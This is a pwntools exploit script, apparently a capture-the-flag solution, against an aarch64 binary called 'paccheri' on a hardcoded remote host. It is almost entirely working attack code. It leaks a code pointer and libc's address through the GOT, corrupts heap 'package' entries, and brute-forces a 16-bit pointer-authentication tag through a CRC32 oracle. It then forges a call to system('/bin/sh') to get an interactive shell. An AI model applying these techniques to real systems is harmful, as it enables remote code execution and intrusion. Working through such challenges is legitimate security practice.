from pwn import *
import re
from zlib import crc32


context.arch="aarch64"
#context.log_level = 'debug'
elf = ELF('handout/paccheri')
elf2 = ELF('handout/paccheri')
#r = process("paccheri")
#r = remote("localhost", 3700)
r = remote("95.216.35.42", 3700)
gdbscript = """
# b decrypt_da_pointer
"""
# gdbscript += "continue\n"*40
# gdbscript += "record full"
# r = gdb.debug("./a.out", gdbscript=gdbscript)


def allocate(address):
    r.sendlineafter(b"Exit", b"1")
    r.sendlineafter(b"address", address)

def free(number):
    r.sendlineafter(b"Exit", b"2")
    r.sendlineafter(b"Which", str(number).encode('ascii'))

def edit(number, address):
    r.sendlineafter(b"Exit", b"4")
    r.sendlineafter(b"Which", str(number).encode('ascii'))
    r.sendlineafter(b"address", address)

def plist():
    r.sendlineafter(b"Exit", b"3")
    return r.recvuntil(b"1.").decode('ascii')

def myencrypt(x):
    r.sendlineafter(b"Exit", b"1337")
    r.sendlineafter(b"Gimme", str(x).encode('ascii'))
    res =  r.recvline()
    res =  r.recvline()
    res =  r.recvline()
    return res.decode()


x = [allocate("ciaobella") for x in range(19)]

# grab da leak
thelist = plist()
callback_leak = int(re.search(r"callback: ([x0-9a-f].*)\n", thelist).group(1), 16)
default_callback = 0xee0 - 4
elf2.address = callback_leak - (default_callback)
print(hex(elf2.address))


print("Got callback", hex(callback_leak))


free(18) # 18th package

allocate("a") # 19th package

# overwrite
# call oracle that gives correct auth tag
# overwrite again with correct auth tag
# oracle(i) = callback[i] ^ auth(addrpart(callback[i]), state[i])


# win_addr is not encrypted
# we need to encrypt it ourselves

# enc_printf_addr = int(re.search(r"Result: ([x0-9a-f].*)\n", myencrypt(elf2.got.printf)).group(1), 16)
edit(18, p64(elf2.got.printf)+b"a"*8 + p64(elf2.got.printf)) # 18th package

allocate("fake")
allocate("fake")

print(plist())

text = r.recvuntil(b"Complain")
text = r.recvuntil(b"Complain")
text = r.recvuntil(b"Complain")
text = r.recvuntil(b"arrived")


out = re.findall(b"Address: (.*)id:", text)
printf_leak = u64(out[1].ljust(8, b'\x00'))
libc = ELF("handout/libc.so.6")
libc.address = printf_leak - libc.sym['printf']

print("Got libc leak")
print(hex(libc.address))

print(hex(printf_leak))


edit(18, p64(libc.sym.system)+b";"*8 + p64(libc.sym.system)) # 18th package

print(plist())
text = r.recvuntil("Error state: ")
crc_result = int(r.recvline(), 16)
print(hex(crc_result))

for tag in range(2**16):
    crc = 0
    for x in range(19):
        crc = crc32(b"\x00"*8, crc)
    crc = crc32(p64(tag << 48), crc)
    if crc == crc_result:
        print("win!")
        break
else:
    print("no")
    exit(1)


# enc_win_addr = int(re.search(r"Result: ([x0-9a-f].*)\n", myencrypt(libc.sym.system)).group(1), 16)
# print("Got encrypted callback", hex(enc_win_addr))


enc_win_addr = (libc.sym.system)  +  (tag << 48)
print(hex(enc_win_addr))


# edit(18, p64(next(libc.search(b"/bin/sh")))+b";"*8 + p64(enc_win_addr)) # 18th package
edit(18, p64(next(libc.search(b"/bin/sh")))+b";"*8 + p64(enc_win_addr)) # 18th package


r.sendline(b"5")
r.sendlineafter(b"package", b"19")

r.interactive()
